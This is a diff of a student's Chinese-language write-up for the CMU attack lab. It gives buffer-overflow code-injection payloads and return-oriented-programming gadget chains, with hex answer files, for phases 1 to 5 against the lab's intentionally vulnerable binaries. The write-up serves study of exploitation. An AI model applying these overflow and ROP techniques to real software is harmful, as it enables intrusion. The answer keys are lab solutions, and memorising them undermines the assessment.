@@ -78,7 +78,7 @@ void test()
 
 
 
-#### level 1
+#### phase1
 
 通过代码注入执行让程序调用touch1()
 
@@ -124,16 +124,17 @@ touch1 地址为0x4017c0
 ##### ans1.txt
 
 ```
-00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00
-c0 17 40
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c0 17 40 00 00 00 00 00
 ```
 
 
 
-#### level2
+#### phase2
 
 touch2
 
@@ -242,12 +243,12 @@ c3
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00
-78 dc 61 55
+78 dc 61 55 00 00 00 00
 ```
 
 
 
-#### level3
+#### phase3
 
 hexmatch
 
@@ -339,7 +340,7 @@ gcc -c level3.s
 objdump -d level3.o > level3.asm
 ```
 
-level2.asm
+level3.asm
 
 ```assembly
 0000000000000000 <.text>:
@@ -365,8 +366,252 @@ c3
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00
-78 dc 61 55
-00 00 00 00
+78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61 00
+```
+
+
+
+
+
+#### phase4
+
+```shell
+gcc -c -Og farm.c
+objdump -d farm.o > farm.asm
+```
+
+
+
+依然是要调用touch2
+
+```assembly
+mov $0x59b997fa, %rdi
+pushq $0x4017ec
+retq
+```
+
+```assembly
+0000000000000000 <.text>:
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+   7:	68 ec 17 40 00       	pushq  $0x4017ec
+   c:	c3                   	retq   
+```
+
+
+
+advice中提醒我们使用两端gadgets就能实现，而且是在start_farm和mid_farm中寻找
+
+```assembly
+0000000000000006 <getval_142>:
+   6:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
+   b:	c3                   	retq   
+
+000000000000000c <addval_273>:
+   c:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  12:	c3                   	retq   
+
+0000000000000013 <addval_219>:
+  13:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  19:	c3                   	retq   
+
+000000000000001a <setval_237>:
+  1a:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
+  20:	c3                   	retq   
+
+0000000000000021 <setval_424>:
+  21:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
+  27:	c3                   	retq   
+
+0000000000000028 <setval_470>:
+  28:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
+  2e:	c3                   	retq   
+
+000000000000002f <setval_426>:
+  2f:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  35:	c3                   	retq   
+
+0000000000000036 <getval_280>:
+  36:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  3b:	c3                   	retq  
+```
+
+不能找到直接将cookie值写入的字节
+
+考虑使用popq，查表（Figure3 B）得范围为58-5f，只有58在farm中
+
+确定第一步为
+
+popq %rax 
+
+因为两步可以完成，下一步一定是movq %rax %rdi
+
+查表（Figure3 A）得 48 89 c7
+
+```assembly
+popq %rax
+retq
+movq %rax,%rdi
+retq
+```
+
+
+
+!!90代表空操作!!
+
+```assembly
+0000000000000036 <getval_280>:
+  36:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  3b:	c3                   	retq  
+000000000000002f <setval_426>:
+  2f:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  35:	c3                   	retq   
+```
+
+选择好gadgets，注意，跳转地址为ratarget内，不是fram内的地址
+
+
+
+##### ans4.txt
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+cc 19 40 00 00 00 00 00 #popq %rax ; ret
+fa 97 b9 59 00 00 00 00 #cookie
+c5 19 40 00 00 00 00 00 #movq %rax %rdi ; ret
+ec 17 40 00 00 00 00 00 #touch2
+```
+
+
+
+
+
+#### phase5
+
+Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3,
+
+you caused a program to execute machine code of your own design. If CTARGET had been a network server,
+
+you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the
+
+main devices modern systems use to thwart buffer overflflow attacks. Although you did not inject your own
+
+code, you were able inject a type of program that operates by stitching together sequences of existing code.
+
+You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations
+
+consider stopping right now.
+
+他真的，我哭死
+
+
+
+调用touch3
+
+官方题解使用8个gadgets
+
+ascii要存在栈中，偏移量无法直接写入，使用farm.c中的add_xy
+
+
+
+###### 因此需要将rsp的值保存下来
+
+查表（Figure3 A）得 48 89 {e0-e7}
+
+farm内只有48 89 e0
+
+movq %rsp,%rax
+
+
+
+再从rax内保存
+
+48 89 {c0-c7}
+
+存在c7
+
+movq %rax,%rdi
+
+
+
+成功将rsp保存在rsi内
+
+
+
+###### 计算偏移地址
+
+根据phase4，只有
+
+popq %rax
+
+
+
+为了调用add_xy计算，将rax的值写入rsi
+
+排查过程省略
+
+movl %eax,%ecx
+
+movl %ecx,%edx
+
+movl %edx,%esi
+
+add_xy
+
+movq %rax,%rsi
+
+
+
+
+
+
+
+
+
+```assembly
+movq %rsp,%rax
+retq
+movq %rax,%rdi
+retq
+popq %rax
+movl %eax,%ecx
+retq
+movl %ecx,%edx
+retq
+movl %edx,%esi
+retq
+call add_xy
+retq
+movq %rax,%rsi
+retq
+```
+
+
+
+计算过程略
+
+##### ans5.txt
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+cc 19 40 00 00 00 00 00
+48 00 00 00 00 00 00 00 #偏移量，注入完代码后再保存ascii，获得偏移量
+dd 19 40 00 00 00 00 00 
+70 1a 40 00 00 00 00 00 
+13 1a 40 00 00 00 00 00 
+d6 19 40 00 00 00 00 00 
+a2 19 40 00 00 00 00 00 
+fa 18 40 00 00 00 00 00 
 35 39 62 39 39 37 66 61 00
 ```
 
@@ -378,4 +623,6 @@ c3
 
 #### p.s.
 
-想办法调用validate是不是就能直接得分了
+想办法调用validate是不是就能直接得分了，不知道有什么保护措施
+
+读汇编代码时，不用像bomblab一样一行行读，切实了解了segmentation fault的隐患，加深了code injection的概念
